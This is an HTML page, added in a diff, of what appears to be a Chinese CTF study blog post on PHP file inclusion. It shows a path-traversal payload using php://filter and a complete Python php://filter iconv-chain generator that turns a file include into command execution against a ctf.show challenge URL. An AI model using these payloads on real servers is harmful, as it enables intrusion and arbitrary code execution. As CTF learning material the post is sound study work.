@@ -1,0 +1,673 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/blogs/img/goodnight.png">
+  <link rel="icon" href="/blogs/img/goodnight.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="在python服务器上运行这种情况下网页由python(flask)写成，可以利用文件包含漏洞查看源码，首先需要知道源码文件名（一般情况下是app.py），可以通过包含根目录下&#96;proc&#x2F;self&#x2F;cmdline&#96;，查看启动当前进程的命令，得到源码文件名，再进行包含。  当要求包含的文件名中必须有特定字符像这样 123if( strpos( $file, &quot;woofers&quot; )">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php文件包含漏洞">
+<meta property="og:url" content="http://mekrina.github.io/blogs/php/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="mekrina">
+<meta property="og:description" content="在python服务器上运行这种情况下网页由python(flask)写成，可以利用文件包含漏洞查看源码，首先需要知道源码文件名（一般情况下是app.py），可以通过包含根目录下&#96;proc&#x2F;self&#x2F;cmdline&#96;，查看启动当前进程的命令，得到源码文件名，再进行包含。  当要求包含的文件名中必须有特定字符像这样 123if( strpos( $file, &quot;woofers&quot; )">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
+<meta property="article:modified_time" content="2025-05-30T01:24:16.961Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>php文件包含漏洞 - mekrina</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/blogs/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/blogs/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/blogs/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mekrina.github.io","root":"/blogs/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/blogs/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/blogs/js/utils.js" ></script>
+  <script  src="/blogs/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/blogs/">
+      <strong>home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/blogs/img/%E9%9B%AA%E5%B1%B1%E6%98%9F%E7%A9%BA.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php文件包含漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-20 21:06" pubdate>
+          2025年1月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">php文件包含漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="在python服务器上运行"><a href="#在python服务器上运行" class="headerlink" title="在python服务器上运行"></a>在python服务器上运行</h2><pre><code class="hljs">这种情况下网页由python(flask)写成，可以利用文件包含漏洞查看源码，首先需要知道源码文件名（一般情况下是app.py），可以通过包含根目录下`proc/self/cmdline`，查看启动当前进程的命令，得到源码文件名，再进行包含。
+</code></pre>
+<h2 id="当要求包含的文件名中必须有特定字符"><a href="#当要求包含的文件名中必须有特定字符" class="headerlink" title="当要求包含的文件名中必须有特定字符"></a>当要求包含的文件名中必须有特定字符</h2><p>像这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>	<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre><code class="hljs">可以考虑使用woofers/../flag这样来回到上级目录再重新进入想要的文件
+**注意：**
+这里实际上存在的文件是 woofers.php、index.php
+本地测试时woofers.php/../flag和woofers/../flag均可以
+但是当时刷题时 只有woofers/../flag可以，不知道咋回事
+payload = ?catogory=php://filter/read=convert.base64-encode/resource=woofers/../flag.php
+</code></pre>
+<h2 id="无法写入"><a href="#无法写入" class="headerlink" title="无法写入"></a>无法写入</h2><h3 id="filter链无中生有"><a href="#filter链无中生有" class="headerlink" title="filter链无中生有"></a>filter链无中生有</h3><p><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">原文</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">tttang</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>file_to_use = <span class="hljs-string">&quot;/etc/passwd&quot;</span><br><br>base64_payload = base64.b64encode(<span class="hljs-string">&#x27;&lt;?=`ls /`; ?&gt;&#x27;</span>.encode()).decode()<br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-keyword">in</span> base64_payload):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid base64 payload&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br>base64_payload = base64_payload.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br>conversions = &#123;<br>    <span class="hljs-string">&#x27;/&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;2&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,<br>    <span class="hljs-string">&#x27;3&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;5&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,<br>	<span class="hljs-string">&#x27;6&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;A&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;E&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,<br>    <span class="hljs-string">&#x27;F&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;G&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,<br>    <span class="hljs-string">&#x27;H&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;I&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;J&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;K&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;L&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,<br>    <span class="hljs-string">&#x27;M&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,<br>    <span class="hljs-string">&#x27;N&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;O&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;Q&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;R&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,<br>	<span class="hljs-string">&#x27;S&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,<br>    <span class="hljs-string">&#x27;T&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,<br>    <span class="hljs-string">&#x27;X&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,<br>	<span class="hljs-string">&#x27;Z&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,<br>	<span class="hljs-string">&#x27;j&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,<br>&#125;<br><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br>url = <span class="hljs-string">&quot;http://9d9bb361-ed34-4fb7-aecf-7b5429c61108.challenge.ctf.show/index/testJson&quot;</span><br>r = requests.get(url, params=&#123;<br>    <span class="hljs-string">&quot;data&quot;</span>: <span class="hljs-string">&#x27;&#123;&#x27;</span> + <span class="hljs-string">f&#x27;&quot;name&quot;:&quot;guest&quot;,&quot;__template_path__&quot;:&quot;<span class="hljs-subst">&#123;final_payload&#125;</span>&quot;&#x27;</span> + <span class="hljs-string">&#x27;&#125;&#x27;</span><br>&#125;)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
